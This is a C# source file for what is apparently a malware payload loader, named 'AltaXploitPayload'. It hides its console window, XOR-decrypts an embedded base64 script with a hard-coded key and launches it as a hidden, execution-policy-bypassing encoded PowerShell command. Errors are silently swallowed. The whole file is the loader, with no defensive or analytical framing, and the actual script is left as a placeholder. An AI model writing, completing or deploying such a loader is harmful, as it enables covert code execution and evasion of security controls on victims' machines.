#nullable disable
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace AltaXploitPayload
{
    class Program
    {
        private static readonly string EncryptedBase64 = "__ENCRYPTED_BASE64__";
        private static readonly string Key = "7cmRSjAlGMszExaV";

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const int STARTF_USESTDHANDLES = 0x00000001;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        static void Main()
        {
            IntPtr console = GetConsoleWindow();
            if (console != IntPtr.Zero)
                ShowWindow(console, SW_HIDE);

            try
            {
                byte[] encrypted = Convert.FromBase64String(EncryptedBase64);
                byte[] decrypted = new byte[encrypted.Length];
                for (int i = 0; i < encrypted.Length; i++)
                    decrypted[i] = (byte)(encrypted[i] ^ Key[i % Key.Length]);
                string script = Encoding.Unicode.GetString(decrypted);
                string cmd = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.dwFlags = STARTF_USESTDHANDLES;
                si.wShowWindow = 0;

                PROCESS_INFORMATION pi;
                bool success = CreateProcess(
                    null,
                    $"powershell.exe -NoP -Ep Bypass -Enc {cmd}",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );
                if (success)
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
            catch { }
        }
    }
}
